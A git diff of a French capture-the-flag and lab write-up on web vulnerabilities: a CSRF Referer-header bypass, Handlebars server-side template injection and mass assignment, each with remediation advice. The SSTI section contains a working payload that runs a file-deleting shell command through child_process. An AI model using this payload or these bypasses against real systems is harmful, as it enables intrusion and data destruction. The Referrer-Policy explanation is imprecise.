@@ -316,7 +316,42 @@ Dans la partie "Body", on applique ce code récupéré depuis la page de mise à
 
 ![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/6.png)
 
-### 5 |
+### 5 | CSRF where Referer validation depends on header being present
+
+[Lien](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
+
+On capture la requête de mise à jour de l'email dans Burp :
+
+![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/1.png)
+
+Ici on ne trouve pas de CSRF, mais en revanche nous avons une indication importante sur le `Referer`.
+On peut donc manipuler cette `Directive` pour essayer de bypasser la potentielle sécurité mise en place.
+
+Passons cette requête dans le Repeater de Burp.
+
+![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/2.png)
+
+En modifiant le `Referer`, la requête est immédiatement rejetée.
+
+![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/3.png)
+
+En revanche, en retirant le `Referer`, on se rend compte que la requête passe correctement.
+
+![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/4.png)
+
+![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/5.png)
+
+On fait donc face à une vulnérabilité sur la vérification du `Referer`. On peut alors en déduire que la vérification du `Referer` ne se fait que si celui-ci existe.
+
+On peut donc passer à la validation du challenge.
+
+![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/5_CSRF_where_Referer_validation_depends_on_header_being_present/6.png)
+
+En ajoutant dans l'en-tête de notre requête la directive `Referrer-Policy: no-referrer`, on fait comprendre à notre serveur que la requête ne contient aucun `Referer`.
+
+Celui-ci va donc valider la requête et modifier l'email de l'utilisateur.
+
+Afin de corriger ce problème, il faudrait une vérification supplémentaire quant à l'existence de la `Directive` `Referer` dans l'en-tête de notre requête.
 
 ### 6 | JWT Jeton révoqué
 
@@ -419,6 +454,7 @@ Un message d'erreur apparaît, confirmant la vulnérabilité SSTI.
 En analysant les messages d'erreur et en testant différentes syntaxes, on identifie que le moteur utilisé est **Handlebars** (Node.js).
 
 Syntaxe Handlebars :
+
 ```handlebars
 {{expression}}
 {{#with variable}}...{{/with}}
@@ -429,6 +465,7 @@ Syntaxe Handlebars :
 En recherchant "Handlebars SSTI exploit", on trouve un exploit connu qui permet d'exécuter des commandes système en manipulant les fonctions internes de JavaScript.
 
 L'exploit utilise :
+
 - `lookup string.sub "constructor"` pour accéder au constructeur de Function
 - `require('child_process')` pour exécuter des commandes système
 
@@ -437,6 +474,7 @@ L'exploit utilise :
 Le payload exploite les blocs `{{#with}}` de Handlebars pour créer une fonction malveillante qui supprime le fichier `/home/carlos/morale.txt` :
 
 Payload (non encodé) :
+
 ```handlebars
 wrtz{{#with "s" as |string|}}
   {{#with "e"}}
@@ -446,7 +484,9 @@ wrtz{{#with "s" as |string|}}
       {{this.pop}}
       {{#with string.split as |codelist|}}
         {{this.pop}}
-        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.push
+          "return require('child_process').exec('rm /home/carlos/morale.txt');"
+        }}
         {{this.pop}}
         {{#each conslist}}
           {{#with (string.sub.apply 0 codelist)}}
@@ -476,8 +516,8 @@ Pour se protéger contre les vulnérabilités SSTI :
 5. **Utiliser des templates statiques pré-compilés** : Éviter la compilation dynamique basée sur les entrées utilisateur
 
 #### Screenshots
-![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/10_ssti/challenge_success.png)
 
+![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/10_ssti/challenge_success.png)
 
 [Source OWASP - SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
 
@@ -551,6 +591,7 @@ Priority: u=0
 ```
 
 La réponse :
+
 ```http request
 HTTP/1.1 200 OK
 Server: Werkzeug/3.0.5 Python/3.11.10
@@ -623,7 +664,7 @@ Content-Type: application/json
 Réponse :
 
 ```json
-{"message":"User updated sucessfully."}
+{ "message": "User updated sucessfully." }
 ```
 
 La méthode `PUT` sur l'endpoint `/api/user` n'est pas protégée. Nous avons donc pu mettre à jour le rôle de notre utilisateur pour devenir admin sans aucune vérification.
@@ -648,7 +689,9 @@ Priority: u=0
 Réponse :
 
 ```json
-{"message":"Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."}
+{
+  "message": "Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."
+}
 ```
 
 Nous avons confirmé notre statut d'administrateur et récupéré le flag avec succès.
@@ -665,6 +708,6 @@ Pour se protéger contre cette vulnérabilité Mass Assignment :
 [Source OWASP - Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
 
 #### Screenshots
+
 ![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/challenge_success.png)
 ![Screenshot2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/endpoint.png)
-
